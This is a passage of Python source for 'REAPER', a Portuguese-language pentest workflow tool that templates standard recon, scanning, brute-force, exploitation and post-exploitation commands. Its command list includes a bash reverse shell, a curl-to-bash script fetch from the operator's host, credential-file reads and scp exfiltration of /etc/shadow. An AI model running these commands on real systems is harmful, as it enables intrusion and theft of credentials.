#!/usr/bin/env python3
# ============================================================
#  REAPER — Recon, Exploit, Analysis & Post-exploitation
#           Reporting Engine
#  Autor: DarkReaper
# ============================================================

import os, sys, json, datetime, shutil, subprocess
from pathlib import Path
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.text import Text
from rich.prompt import Prompt, Confirm
from rich.rule import Rule
from rich.align import Align
from rich import box
from rich.columns import Columns

console = Console()

INTEL_OK = True

PHASE_COLORS = ["cyan","green","magenta","yellow","red","bright_red","blue"]

# ── Ferramentas executáveis por fase ────────────────────────
# Cada ferramenta tem: nome, descrição, lista de parâmetros a pedir, template do comando
# {TARGET} = IP/domínio alvo do projecto  {PORTA} = porto
TOOL_DEFINITIONS = {

    # ── FASE 1 — Reconhecimento ──────────────────────────────
    1: [
        {
            "name": "whois",
            "desc": "Registo de domínio, IPs e contactos",
            "params": [
                {"key": "alvo", "label": "Domínio ou IP alvo", "default": "{TARGET}"},
            ],
            "cmd": "whois {alvo}",
        },
        {
            "name": "nslookup",
            "desc": "Resolução DNS básica",
            "params": [
                {"key": "alvo", "label": "Domínio", "default": "{TARGET}"},
            ],
            "cmd": "nslookup {alvo}",
        },
        {
            "name": "dig",
            "desc": "DNS completo — A, MX, NS, TXT",
            "params": [
                {"key": "alvo",  "label": "Domínio",              "default": "{TARGET}"},
                {"key": "tipo",  "label": "Tipo de registo",       "default": "ANY"},
            ],
            "cmd": "dig {alvo} {tipo}",
        },
        {
            "name": "dig axfr",
            "desc": "Tentativa de transferência de zona DNS",
            "params": [
                {"key": "dominio",    "label": "Domínio",        "default": "{TARGET}"},
                {"key": "dns_server", "label": "Servidor DNS",   "default": "8.8.8.8"},
            ],
            "cmd": "dig axfr {dominio} @{dns_server}",
        },
        {
            "name": "theHarvester",
            "desc": "Emails, subdomínios, IPs via OSINT (só para domínios públicos)",
            "params": [
                {"key": "dominio", "label": "Domínio alvo (ex: empresa.com)", "default": "{TARGET}"},
                {"key": "fonte",   "label": "Fontes", "default": "google,bing,duckduckgo,crtsh,hackertarget,rapiddns"},
            ],
            "cmd": "theHarvester -d {dominio} -b {fonte}",
            "smart_check": "harvester",
        },
        {
            "name": "netdiscover",
            "desc": "Descoberta de hosts na rede local",
            "params": [
                {"key": "rede", "label": "Rede (ex: 192.168.1.0/24)", "default": ""},
            ],
            "cmd": "netdiscover -r {rede}",
        },
        {
            "name": "ping sweep (nmap)",
            "desc": "Hosts activos na rede",
            "params": [
                {"key": "rede", "label": "Rede (ex: 192.168.1.0/24)", "default": ""},
            ],
            "cmd": "nmap -sn {rede}",
        },
        {
            "name": "traceroute",
            "desc": "Rota de rede até ao alvo",
            "params": [
                {"key": "alvo", "label": "IP / Domínio alvo", "default": "{TARGET}"},
            ],
            "cmd": "traceroute {alvo}",
        },
    ],

    # ── FASE 2 — Scanning ────────────────────────────────────
    2: [
        {
            "name": "nmap básico",
            "desc": "Versões, scripts padrão e SO",
            "params": [
                {"key": "alvo", "label": "IP / Domínio alvo", "default": "{TARGET}"},
            ],
            "cmd": "nmap -sV -sC -O {alvo}",
        },
        {
            "name": "nmap completo",
            "desc": "Todos os portos, agressivo",
            "params": [
                {"key": "alvo",   "label": "IP / Domínio alvo",   "default": "{TARGET}"},
                {"key": "output", "label": "Ficheiro de output",   "default": "scan_{alvo}.txt"},
            ],
            "cmd": "nmap -sS -sV -sC -O -p- -T4 -A {alvo} -oN {output}",
        },
        {
            "name": "nmap UDP",
            "desc": "Top 100 portos UDP",
            "params": [
                {"key": "alvo", "label": "IP / Domínio alvo", "default": "{TARGET}"},
            ],
            "cmd": "nmap -sU --top-ports 100 {alvo}",
        },
        {
            "name": "nmap scripts vuln",
            "desc": "Scripts NSE de vulnerabilidades",
            "params": [
                {"key": "alvo",   "label": "IP / Domínio alvo", "default": "{TARGET}"},
                {"key": "portos", "label": "Portos (ex: 80,443 ou all)", "default": ""},
            ],
            "cmd": "nmap --script vuln -p {portos} {alvo}",
        },
        {
            "name": "nmap evasão firewall",
            "desc": "Fragmentação + decoy para evasão IDS",
            "params": [
                {"key": "alvo", "label": "IP / Domínio alvo", "default": "{TARGET}"},
            ],
            "cmd": "nmap -f -D RND:10 {alvo}",
        },
        {
            "name": "masscan",
            "desc": "Scan rápido de todos os portos",
            "params": [
                {"key": "alvo", "label": "IP / Domínio alvo", "default": "{TARGET}"},
                {"key": "rate", "label": "Rate (pacotes/seg)",  "default": "1000"},
            ],
            "cmd": "masscan -p1-65535 {alvo} --rate={rate}",
        },
    ],

    # ── FASE 3 — Enumeração ──────────────────────────────────
    3: [
        {
            "name": "gobuster",
            "desc": "Fuzzing de directorias web",
            "params": [
                {"key": "url",      "label": "URL alvo (ex: http://192.168.1.1)", "default": "http://{TARGET}"},
                {"key": "wordlist", "label": "Wordlist", "default": "/usr/share/wordlists/dirb/common.txt"},
                {"key": "ext",      "label": "Extensões (ex: php,html,txt)",      "default": "php,html,txt"},
                {"key": "output",   "label": "Ficheiro output",                    "default": "gobuster_{TARGET}.txt"},
            ],
            "cmd": "gobuster dir -u {url} -w {wordlist} -x {ext} -o {output}",
        },
        {
            "name": "feroxbuster",
            "desc": "Fuzzing recursivo de directorias web",
            "params": [
                {"key": "url",      "label": "URL alvo (ex: http://192.168.1.1)", "default": "http://{TARGET}"},
                {"key": "wordlist", "label": "Wordlist", "default": "/usr/share/wordlists/dirb/common.txt"},
                {"key": "ext",      "label": "Extensões (ex: php,html)",          "default": "php,html"},
                {"key": "depth",    "label": "Profundidade recursiva",             "default": "3"},
                {"key": "output",   "label": "Ficheiro output",                    "default": "ferox_{TARGET}.txt"},
            ],
            "cmd": "feroxbuster -u {url} -w {wordlist} -x {ext} -d {depth} -o {output}",
        },
        {
            "name": "dirb",
            "desc": "Enumeração de directorias web",
            "params": [
                {"key": "url",      "label": "URL alvo",  "default": "http://{TARGET}"},
                {"key": "wordlist", "label": "Wordlist (ENTER para padrão)", "default": ""},
            ],
            "cmd": "dirb {url} {wordlist}",
        },
        {
            "name": "nikto",
            "desc": "Scanner de vulnerabilidades web",
            "params": [
                {"key": "alvo",   "label": "IP / URL alvo",       "default": "{TARGET}"},
                {"key": "porto",  "label": "Porto",                "default": "80"},
                {"key": "output", "label": "Ficheiro output",      "default": "nikto_{TARGET}.txt"},
            ],
            "cmd": "nikto -h {alvo} -p {porto} -o {output}",
        },
        {
            "name": "wpscan",
            "desc": "Scan WordPress — users, plugins, temas",
            "params": [
                {"key": "url",         "label": "URL WordPress",          "default": "http://{TARGET}"},
                {"key": "enumerate",   "label": "Enumeração (u=users, p=plugins, t=temas, vp=plugins vuln)", "default": "u,vp"},
                {"key": "wordlist",    "label": "Wordlist passwords (ENTER para saltar)", "default": ""},
            ],
            "cmd": "wpscan --url {url} -e {enumerate} --passwords {wordlist}",
        },
        {
            "name": "enum4linux",
            "desc": "Enumeração SMB/Samba completa",
            "params": [
                {"key": "alvo", "label": "IP alvo", "default": "{TARGET}"},
            ],
            "cmd": "enum4linux -a {alvo}",
        },
        {
            "name": "smbclient",
            "desc": "Listar partilhas SMB",
            "params": [
                {"key": "alvo", "label": "IP alvo", "default": "{TARGET}"},
            ],
            "cmd": "smbclient -L //{alvo} -N",
        },
        {
            "name": "smbmap",
            "desc": "Mapeamento de partilhas e permissões SMB",
            "params": [
                {"key": "alvo", "label": "IP alvo", "default": "{TARGET}"},
            ],
            "cmd": "smbmap -H {alvo}",
        },
        {
            "name": "nikto SSL",
            "desc": "Scanner web com SSL/HTTPS",
            "params": [
                {"key": "alvo",  "label": "IP / URL alvo", "default": "{TARGET}"},
                {"key": "porto", "label": "Porto SSL",      "default": "443"},
            ],
            "cmd": "nikto -h {alvo} -p {porto} -ssl",
        },
        {
            "name": "snmpwalk",
            "desc": "Enumeração SNMP",
            "params": [
                {"key": "alvo",      "label": "IP alvo",          "default": "{TARGET}"},
                {"key": "community", "label": "Community string",  "default": "public"},
            ],
            "cmd": "snmpwalk -v2c -c {community} {alvo}",
        },
        {
            "name": "nmap ssh-enum",
            "desc": "Métodos de autenticação SSH",
            "params": [
                {"key": "alvo", "label": "IP alvo", "default": "{TARGET}"},
            ],
            "cmd": "nmap -p 22 --script ssh-auth-methods {alvo}",
        },
        {
            "name": "ftp anónimo",
            "desc": "Testar acesso FTP anónimo",
            "params": [
                {"key": "alvo", "label": "IP alvo", "default": "{TARGET}"},
            ],
            "cmd": "ftp {alvo}",
        },
    ],

    # ── FASE 4 — Análise de Vulnerabilidades ─────────────────
    4: [
        {
            "name": "nmap --script vuln",
            "desc": "Scripts NSE de vulnerabilidades em todos os portos",
            "params": [
                {"key": "alvo",   "label": "IP / Domínio alvo",              "default": "{TARGET}"},
                {"key": "portos", "label": "Portos (ENTER para todos abertos)", "default": ""},
            ],
            "cmd": "nmap --script vuln -sV {alvo}",
        },
        {
            "name": "searchsploit",
            "desc": "Pesquisa local de exploits no ExploitDB",
            "params": [
                {"key": "servico", "label": "Serviço / software",  "default": ""},
                {"key": "versao",  "label": "Versão (ex: 2.4.49)", "default": ""},
            ],
            "cmd": "searchsploit {servico} {versao}",
        },
        {
            "name": "searchsploit -x",
            "desc": "Ver código de um exploit específico",
            "params": [
                {"key": "path", "label": "Caminho do exploit (ex: linux/remote/12345.py)", "default": ""},
            ],
            "cmd": "searchsploit -x {path}",
        },
        {
            "name": "searchsploit -m",
            "desc": "Copiar exploit para directoria actual",
            "params": [
                {"key": "path", "label": "Caminho do exploit", "default": ""},
            ],
            "cmd": "searchsploit -m {path}",
        },
        {
            "name": "nmap vulners",
            "desc": "CVEs automáticos por versão de serviço",
            "params": [
                {"key": "alvo", "label": "IP / Domínio alvo", "default": "{TARGET}"},
            ],
            "cmd": "nmap --script vulners -sV {alvo}",
        },
        {
            "name": "nuclei",
            "desc": "Scanner de vulnerabilidades web com templates",
            "params": [
                {"key": "url",       "label": "URL alvo",                "default": "http://{TARGET}"},
                {"key": "severity",  "label": "Severidade (critical,high,medium)", "default": "critical,high"},
            ],
            "cmd": "nuclei -u {url} -s {severity}",
        },
        {
            "name": "msfconsole search",
            "desc": "Pesquisar módulos no Metasploit",
            "params": [
                {"key": "termo", "label": "Serviço / CVE / produto", "default": ""},
            ],
            "cmd": "msfconsole -q -x 'search {termo}; exit'",
        },
    ],

    # ── FASE 5 — Exploração ──────────────────────────────────
    5: [
        {
            "name": "hydra SSH",
            "desc": "Brute force SSH",
            "params": [
                {"key": "alvo",     "label": "IP alvo",                          "default": "{TARGET}"},
                {"key": "user",     "label": "Utilizador (ou ficheiro -L)",       "default": "root"},
                {"key": "wordlist", "label": "Wordlist passwords",                "default": "/usr/share/wordlists/rockyou.txt"},
                {"key": "threads",  "label": "Threads",                           "default": "4"},
            ],
            "cmd": "hydra -l {user} -P {wordlist} -t {threads} ssh://{alvo}",
        },
        {
            "name": "hydra FTP",
            "desc": "Brute force FTP",
            "params": [
                {"key": "alvo",     "label": "IP alvo",          "default": "{TARGET}"},
                {"key": "user",     "label": "Utilizador",        "default": "admin"},
                {"key": "wordlist", "label": "Wordlist passwords","default": "/usr/share/wordlists/rockyou.txt"},
            ],
            "cmd": "hydra -l {user} -P {wordlist} ftp://{alvo}",
        },
        {
            "name": "hydra HTTP form",
            "desc": "Brute force formulário web",
            "params": [
                {"key": "alvo",     "label": "IP alvo",                        "default": "{TARGET}"},
                {"key": "path",     "label": "Path do login (ex: /login.php)", "default": "/login.php"},
                {"key": "user",     "label": "Utilizador",                     "default": "admin"},
                {"key": "wordlist", "label": "Wordlist passwords",             "default": "/usr/share/wordlists/rockyou.txt"},
                {"key": "fail_str", "label": "String de falha (ex: Invalid)",  "default": "Invalid"},
            ],
            "cmd": "hydra -l {user} -P {wordlist} {alvo} http-post-form '{path}:username=^USER^&password=^PASS^:F={fail_str}'",
        },
        {
            "name": "john",
            "desc": "Cracking de hashes com John the Ripper",
            "params": [
                {"key": "hash_file","label": "Ficheiro com hash(es)",           "default": "hash.txt"},
                {"key": "wordlist", "label": "Wordlist",                        "default": "/usr/share/wordlists/rockyou.txt"},
                {"key": "formato",  "label": "Formato (ex: md5, sha256, auto)", "default": ""},
            ],
            "cmd": "john --wordlist={wordlist} {hash_file}",
        },
        {
            "name": "hashcat",
            "desc": "Cracking GPU de hashes",
            "params": [
                {"key": "modo",     "label": "Modo (-m): 0=MD5 100=SHA1 1800=sha512crypt", "default": "0"},
                {"key": "hash_file","label": "Ficheiro com hash",               "default": "hash.txt"},
                {"key": "wordlist", "label": "Wordlist",                        "default": "/usr/share/wordlists/rockyou.txt"},
            ],
            "cmd": "hashcat -m {modo} {hash_file} {wordlist}",
        },
        {
            "name": "msfvenom payload",
            "desc": "Gerar payload de reverse shell",
            "params": [
                {"key": "payload",  "label": "Payload (ex: linux/x86/shell_reverse_tcp)", "default": "linux/x86/shell_reverse_tcp"},
                {"key": "lhost",    "label": "Teu IP (LHOST)",                            "default": ""},
                {"key": "lport",    "label": "Porta (LPORT)",                             "default": "4444"},
                {"key": "formato",  "label": "Formato (elf/exe/py/php/raw)",              "default": "elf"},
                {"key": "output",   "label": "Ficheiro output",                           "default": "shell.elf"},
            ],
            "cmd": "msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f {formato} -o {output}",
        },
        {
            "name": "reverse shell bash",
            "desc": "Gerar comando de reverse shell Bash",
            "params": [
                {"key": "lhost", "label": "Teu IP (ouvinte)", "default": ""},
                {"key": "lport", "label": "Porta",            "default": "4444"},
            ],
            "cmd": "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        },
        {
            "name": "netcat listener",
            "desc": "Abrir listener para receber reverse shell",
            "params": [
                {"key": "lport", "label": "Porta de escuta", "default": "4444"},
            ],
            "cmd": "nc -lvnp {lport}",
        },
        {
            "name": "sqlmap",
            "desc": "SQL Injection automático",
            "params": [
                {"key": "url",    "label": "URL vulnerável (ex: http://alvo/page?id=1)", "default": ""},
                {"key": "level",  "label": "Nível (1-5)",                                "default": "3"},
                {"key": "risk",   "label": "Risco (1-3)",                                "default": "2"},
            ],
            "cmd": "sqlmap -u '{url}' --level={level} --risk={risk} --dbs --batch",
        },
    ],

    # ── FASE 6 — Pós-Exploração ──────────────────────────────
    6: [
        {
            "name": "whoami & id",
            "desc": "Utilizador actual e grupos",
            "params": [],
            "cmd": "whoami && id",
        },
        {
            "name": "uname",
            "desc": "Kernel, arquitectura e sistema",
            "params": [],
            "cmd": "uname -a && cat /etc/os-release",
        },
        {
            "name": "sudo -l",
            "desc": "Comandos sudo sem password",
            "params": [],
            "cmd": "sudo -l",
        },
        {
            "name": "SUID binários",
            "desc": "Procurar binários com SUID activado",
            "params": [],
            "cmd": "find / -perm -4000 2>/dev/null",
        },
        {
            "name": "SGID binários",
            "desc": "Procurar binários com SGID activado",
            "params": [],
            "cmd": "find / -perm -2000 2>/dev/null",
        },
        {
            "name": "crontab",
            "desc": "Tarefas agendadas do sistema",
            "params": [],
            "cmd": "crontab -l 2>/dev/null; cat /etc/crontab 2>/dev/null",
        },
        {
            "name": "capabilities",
            "desc": "Capabilities especiais de binários",
            "params": [],
            "cmd": "getcap -r / 2>/dev/null",
        },
        {
            "name": "linpeas (remoto)",
            "desc": "Executa linpeas via HTTP do teu servidor",
            "params": [
                {"key": "lhost", "label": "Teu IP (servidor HTTP)", "default": ""},
                {"key": "output","label": "Ficheiro output",         "default": "linpeas_out.txt"},
            ],
            "cmd": "curl http://{lhost}/linpeas.sh | bash | tee {output}",
        },
        {
            "name": "linpeas (local)",
            "desc": "Executa linpeas já transferido",
            "params": [
                {"key": "output","label": "Ficheiro output", "default": "linpeas_out.txt"},
            ],
            "cmd": "chmod +x linpeas.sh && ./linpeas.sh | tee {output}",
        },
        {
            "name": "/etc/passwd",
            "desc": "Listar utilizadores do sistema",
            "params": [],
            "cmd": "cat /etc/passwd",
        },
        {
            "name": "history",
            "desc": "Histórico de comandos do utilizador",
            "params": [],
            "cmd": "cat ~/.bash_history",
        },
        {
            "name": "rede interna",
            "desc": "Interfaces, IPs e portos internos activos",
            "params": [],
            "cmd": "ip a && ss -tulnp",
        },
        {
            "name": "exfiltração SCP",
            "desc": "Copiar ficheiro para a tua máquina",
            "params": [
                {"key": "ficheiro", "label": "Ficheiro a exfiltrar",       "default": "/etc/shadow"},
                {"key": "lhost",    "label": "Teu IP",                     "default": ""},
                {"key": "dest",     "label": "Destino (ex: /tmp/loot/)",   "default": "/tmp/loot/"},
            ],
            "cmd": "scp {ficheiro} {lhost}:{dest}",
        },
    ],
}

# ── Estrutura das 7 fases ───────────────────────────────────
PHASES = [
    {
        "id": 1, "name": "RECONHECIMENTO",
        "subtitle": "Recolha passiva de informação",
        "icon": "🔍",
        "desc": "Recolha de informação sem interagir directamente com o alvo. Mapeamento da superfície de ataque.",
        "fields": [
            ("alvo_ip",      "IP / Domínio alvo"),
            ("rede",         "Rede (ex: 192.168.1.0/24)"),
            ("hosts_ativos", "Hosts activos encontrados"),
            ("dns_info",     "Informação DNS recolhida"),
            ("emails",       "Emails / utilizadores encontrados"),
            ("notas",        "Notas gerais"),
        ]
    },
    {
        "id": 2, "name": "SCANNING / VARREDURA",
        "subtitle": "Varredura activa de portos e serviços",
        "icon": "📡",
        "desc": "Interacção directa com o alvo para identificar portos abertos, serviços e sistema operativo.",
        "fields": [
            ("portos_tcp",  "Portos TCP abertos"),
            ("portos_udp",  "Portos UDP abertos"),
            ("servicos",    "Serviços identificados"),
            ("so",          "Sistema Operativo detectado"),
            ("versoes",     "Versões de serviços"),
            ("notas",       "Notas gerais"),
        ]
    },
    {
        "id": 3, "name": "ENUMERAÇÃO",
        "subtitle": "Extracção detalhada de informação dos serviços",
        "icon": "🗂️",
        "desc": "Enumeração profunda de cada serviço — utilizadores, directorias, versões, configurações.",
        "fields": [
            ("diretorias_web","Directorias/ficheiros web encontrados"),
            ("utilizadores",  "Utilizadores enumerados"),
            ("partilhas_smb", "Partilhas SMB encontradas"),
            ("cms_info",      "CMS / versão (WordPress, Joomla, etc.)"),
            ("plugins_vulns", "Plugins / componentes vulneráveis"),
            ("notas",         "Notas gerais"),
        ]
    },
    {
        "id": 4, "name": "ANÁLISE DE VULNERABILIDADES",
        "subtitle": "Identificação e validação de vulnerabilidades",
        "icon": "🔬",
        "desc": "Análise das vulnerabilidades encontradas, pesquisa de exploits e validação de CVEs.",
        "fields": [
            ("cves",         "CVEs identificados"),
            ("exploits",     "Exploits disponíveis encontrados"),
            ("risco",        "Nível de risco (Crítico/Alto/Médio/Baixo)"),
            ("vetor_ataque", "Vector de ataque principal"),
            ("notas",        "Notas gerais"),
        ]
    },
    {
        "id": 5, "name": "EXPLORAÇÃO",
        "subtitle": "Execução de exploits e obtenção de acesso",
        "icon": "💥",
        "desc": "Execução controlada de exploits para obter acesso ao sistema alvo.",
        "fields": [
            ("exploit_usado","Exploit / módulo utilizado"),
            ("credenciais",  "Credenciais obtidas"),
            ("acesso",       "Tipo de acesso obtido"),
            ("user_obtido",  "Utilizador com que entrou"),
            ("flags",        "Flags / ficheiros sensíveis"),
            ("notas",        "Notas gerais"),
        ]
    },
    {
        "id": 6, "name": "PÓS-EXPLORAÇÃO",
        "subtitle": "Escalada de privilégios e persistência",
        "icon": "🏴",
        "desc": "Após acesso inicial — escalada de privilégios, recolha interna e movimentação lateral.",
        "fields": [
            ("privilegio",     "Nível de privilégio obtido"),
            ("metodo_privesc", "Método de escalada usado"),
            ("root_flag",      "Flag de root / ficheiros sensíveis"),
            ("dados_exfil",    "Dados exfiltrados"),
            ("persistencia",   "Método de persistência instalado"),
            ("notas",          "Notas gerais"),
        ]
    },
    {
        "id": 7, "name": "RELATÓRIO",
        "subtitle": "Documentação e geração do relatório final",
        "icon": "📄",
        "desc": "Compilação de todos os dados recolhidos num relatório profissional.",
        "fields": [
            ("titulo",         "Título do relatório"),
            ("sumario_exec",   "Sumário executivo"),
            ("vulns_criticas", "Vulnerabilidades críticas"),
            ("recomendacoes",  "Recomendações de remediação"),
            ("notas",          "Notas finais"),
        ]
    },
]

# ── Estado global ───────────────────────────────────────────
PROJECT = {
    "name": "", "target": "", "date": "", "tester": "DarkReaper",
    "phases": {str(i): {} for i in range(1, 8)},
}
PROJECT_FILE = ""
PROJECTS_DIR = os.path.expanduser("~/reaper_projects")

# ── Utilitários ─────────────────────────────────────────────
def clear():
    os.system("clear")

def pause():
    console.print("\n[dim]Prima ENTER para continuar...[/dim]")
    input()

def save_project():
    global PROJECT_FILE
    os.makedirs(PROJECTS_DIR, exist_ok=True)
    if PROJECT_FILE:
        # Always save in PROJECTS_DIR
        fname = os.path.basename(PROJECT_FILE)
        full_path = os.path.join(PROJECTS_DIR, fname)
        PROJECT_FILE = full_path
        with open(full_path, "w") as f:
            json.dump(PROJECT, f, indent=2, ensure_ascii=False)

def resolve_defaults(params, target):
    """Substitui {TARGET} nos defaults pelo alvo do projecto."""
    for p in params:
        p["default"] = p["default"].replace("{TARGET}", target)
    return params

# ── Banner ───────────────────────────────────────────────────
def banner():
    clear()
    art = r"""
██████╗ ███████╗ █████╗ ██████╗ ███████╗██████╗ 
██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗
██████╔╝█████╗  ███████║██████╔╝█████╗  ██████╔╝
██╔══██╗██╔══╝  ██╔══██║██╔═══╝ ██╔══╝  ██╔══██╗
██║  ██║███████╗██║  ██║██║     ███████╗██║  ██║
╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝"""
    console.print(Align.center(Text(art, style="bold red")))
    console.print(Align.center(Text(
        "Recon · Exploit · Analysis · Post-exploitation · Reporting Engine", style="dim red")))
    console.print(Align.center(Text("[ DarkReaper ]", style="bold white")))
    console.print(Rule(style="red"))

# ── Menu Principal ───────────────────────────────────────────
def main_menu():
    while True:
        banner()
        proj_info = (f"[bold cyan]{PROJECT['name']}[/bold cyan]  →  "
                     f"[yellow]{PROJECT['target']}[/yellow]  "
                     f"[dim]{PROJECT['date']}[/dim]") \
                    if PROJECT['name'] else "[dim]Nenhum projecto activo[/dim]"
        console.print(Panel(proj_info, title="Projecto Activo", border_style="red", padding=(0,2)))

        prog = Table(box=box.SIMPLE, show_header=False, padding=(0,1))
        prog.add_column(width=4); prog.add_column(width=32); prog.add_column(width=12)
        for ph in PHASES:
            pid   = str(ph["id"])
            fill  = len([v for v in PROJECT["phases"].get(pid,{}).values() if str(v).strip()])
            total = len(ph["fields"])
            c     = PHASE_COLORS[ph["id"]-1]
            st    = f"[green]●[/green] {fill}/{total}" if fill > 0 else f"[dim]○ 0/{total}[/dim]"
            menu_num = ph["id"] + 2
            prog.add_row(f"[{c}][{menu_num}][/{c}]", f"[{c}]{ph['icon']} {ph['name']}[/{c}]", st)
        console.print(Panel(prog, title="7 Passos", border_style="dim red", padding=(0,1)))
        console.print()

        menu = Table(box=box.SIMPLE, show_header=False, padding=(0,2))
        menu.add_column(style="bold cyan", width=8); menu.add_column()
        menu.add_row("[1]",   "Novo Projecto")
        menu.add_row("[2]",   "Carregar Projecto")
        menu.add_row("[3-9]", "Entrar numa fase (3=Fase1 … 9=Fase7)")
        menu.add_row("[R]",   "Gerar Relatório")
        menu.add_row("[I]",   "Motor de Inteligência — detectar e atacar vectores")
        menu.add_row("[Q]",   "Sair")
        console.print(menu)

        ch = Prompt.ask("[bold red]REAPER[/bold red]").strip().upper()
        if ch == "Q":
            console.print("\n[bold red]Sessão terminada. Stay sharp.[/bold red]\n")
            sys.exit(0)
        elif ch == "1": new_project()
        elif ch == "2": load_project_menu()
        elif ch == "R": report_menu()
        elif ch == "I":
            if INTEL_OK:
                if not PROJECT["name"]:
                    console.print("[yellow]Cria ou carrega um projecto primeiro.[/yellow]")
                    pause()
                else:
                    intelligence_menu(PROJECT, save_project)
            else:
                console.print("[red]Motor de inteligência não disponível.[/red]")
                pause()
        elif ch in [str(i) for i in range(3, 10)]:
            phase_menu(int(ch) - 2)

# ── Novo / Carregar Projecto ────────────────────────────────
def new_project():
    global PROJECT, PROJECT_FILE
    banner()
    console.print(Panel("[bold cyan]NOVO PROJECTO[/bold cyan]", border_style="cyan"))
    name   = Prompt.ask("[cyan]Nome do projecto[/cyan]")
    target = Prompt.ask("[cyan]IP / Domínio alvo[/cyan]")
    date   = datetime.date.today().isoformat()
    PROJECT = {"name": name, "target": target, "date": date, "tester": "DarkReaper",
               "phases": {str(i): {} for i in range(1, 8)}}
    PROJECT["phases"]["1"]["alvo_ip"] = target
    safe = name.replace(" ","_").replace("/","-")
    os.makedirs(PROJECTS_DIR, exist_ok=True)
    PROJECT_FILE = os.path.join(PROJECTS_DIR, f"reaper_{safe}_{date}.json")
    save_project()
    console.print(f"\n[green]✔ Projecto criado:[/green] [bold]{PROJECT_FILE}[/bold]")
    console.print(f"[dim]Guardado em: {PROJECTS_DIR}[/dim]")
    pause()

def load_project_menu():
    global PROJECT, PROJECT_FILE
    banner()
    console.print(Panel("[bold cyan]CARREGAR PROJECTO[/bold cyan]", border_style="cyan"))

    # Search in PROJECTS_DIR + current dir
    os.makedirs(PROJECTS_DIR, exist_ok=True)
    files_set = {}
    for f in Path(PROJECTS_DIR).glob("reaper_*.json"):
        files_set[str(f)] = f
    for f in Path(".").glob("reaper_*.json"):
        if str(f.resolve()) not in {str(Path(k).resolve()) for k in files_set}:
            files_set[str(f)] = f
    files = sorted(files_set.values(), key=lambda f: f.stat().st_mtime, reverse=True)

    if not files:
        console.print(f"[yellow]Nenhum projecto encontrado em {PROJECTS_DIR}[/yellow]")
        pause(); return

    t = Table(box=box.SIMPLE_HEAD, border_style="dim")
    t.add_column("#", style="bold cyan", width=4)
    t.add_column("Projecto",  style="bold white", width=30)
    t.add_column("Alvo",      style="yellow",      width=18)
    t.add_column("Modificado",style="dim",          width=16)
    t.add_column("Progresso", style="green",        width=10)

    for i, f in enumerate(files, 1):
        mtime = datetime.datetime.fromtimestamp(f.stat().st_mtime).strftime("%Y-%m-%d %H:%M")
        try:
            with open(f) as fh:
                data = json.load(fh)
            proj_name = data.get("name", f.stem)
            proj_target = data.get("target", "—")
            # Count filled phases
            filled = sum(
                1 for pid in data.get("phases", {}).values()
                if any(str(v).strip() for v in pid.values())
            )
            progress = f"{filled}/7 fases"
        except Exception:
            proj_name = f.stem
            proj_target = "—"
            progress = "—"
        t.add_row(str(i), proj_name, proj_target, mtime, progress)

    console.print(t)
    console.print(f"[dim]Pasta de projectos: {PROJECTS_DIR}[/dim]")
    console.print()

    ch = Prompt.ask("[cyan]Número (ENTER para cancelar)[/cyan]", default="")
    if ch.isdigit() and 1 <= int(ch) <= len(files):
        chosen = files[int(ch)-1]
        with open(chosen) as f:
            PROJECT = json.load(f)
        PROJECT_FILE = str(chosen)
        console.print(f"\n[green]✔ Projecto carregado:[/green] [bold]{PROJECT['name']}[/bold]")
        console.print(f"[dim]Alvo: {PROJECT['target']}  |  Data: {PROJECT['date']}[/dim]")
        pause()

# ── Menu de Fase ─────────────────────────────────────────────
def phase_menu(phase_id):
    ph    = PHASES[phase_id - 1]
    color = PHASE_COLORS[phase_id - 1]
    tools = TOOL_DEFINITIONS.get(phase_id, [])

    while True:
        banner()
        console.print(Panel(
            f"[{color}]{ph['icon']}  FASE {ph['id']} — {ph['name']}[/{color}]\n[dim]{ph['desc']}[/dim]",
            border_style=color, padding=(0,2)))
        console.print()

        menu = Table(box=box.SIMPLE, show_header=False, padding=(0,2))
        menu.add_column(style=f"bold {color}", width=6); menu.add_column()
        opt_num = 1
        has_tools = bool(tools)
        if has_tools:
            menu.add_row(f"[{opt_num}]", "Escolher e executar ferramenta")
            tool_opt = str(opt_num); opt_num += 1
        else:
            tool_opt = None
        fill_opt = str(opt_num); menu.add_row(f"[{opt_num}]", "Preencher / Editar dados desta fase"); opt_num += 1
        view_opt = str(opt_num); menu.add_row(f"[{opt_num}]", "Ver dados preenchidos")
        menu.add_row("[B]", "Voltar")
        console.print(menu)

        ch = Prompt.ask(f"[{color}]REAPER › Fase {phase_id}[/{color}]").strip().upper()
        if ch == "B": break
        elif ch == tool_opt and has_tools: tool_selector(ph, color, tools)
        elif ch == fill_opt: fill_phase(ph, color)
        elif ch == view_opt: view_phase_data(ph, color)

# ── Selector de Ferramentas ──────────────────────────────────
def tool_selector(ph, color, tools):
    while True:
        banner()
        console.print(Panel(
            f"[{color}]{ph['icon']} FASE {ph['id']} — {ph['name']} › FERRAMENTAS[/{color}]",
            border_style=color))
        console.print()

        t = Table(box=box.ROUNDED, border_style=color,
                  header_style=f"bold {color}", show_lines=True)
        t.add_column("#",           style=f"bold {color}", width=4, justify="center")
        t.add_column("Ferramenta",  style="bold white",    width=20)
        t.add_column("Descrição",   style="dim white",     width=50)

        for i, tool in enumerate(tools, 1):
            t.add_row(str(i), tool["name"], tool["desc"])

        console.print(t)
        console.print()
        console.print("[dim][número] Escolher ferramenta  [B] Voltar[/dim]")

        ch = Prompt.ask(f"[{color}]Escolha[/{color}]").strip().upper()
        if ch == "B": break
        elif ch.isdigit() and 1 <= int(ch) <= len(tools):
            run_tool(ph, color, tools[int(ch)-1])

# ── Executar Ferramenta ──────────────────────────────────────
def run_tool(ph, color, tool):
    banner()
    console.print(Panel(
        f"[{color}]{ph['icon']} FASE {ph['id']} › {tool['name'].upper()}[/{color}]\n"
        f"[dim]{tool['desc']}[/dim]",
        border_style=color))
    console.print()

    target = PROJECT.get("target", "")
    params = resolve_defaults([dict(p) for p in tool["params"]], target)

    # Recolher parâmetros
    values = {}
    if params:
        console.print(f"[{color}]Parâmetros necessários:[/{color}] [dim](ENTER para aceitar valor sugerido)[/dim]\n")
        for p in params:
            d = p["default"]
            # Se o default é diferente do label, mostra-o; caso contrário só o label
            label_clean = p['label'].lower().replace(" ", "")
            d_clean = d.lower().replace(" ", "")
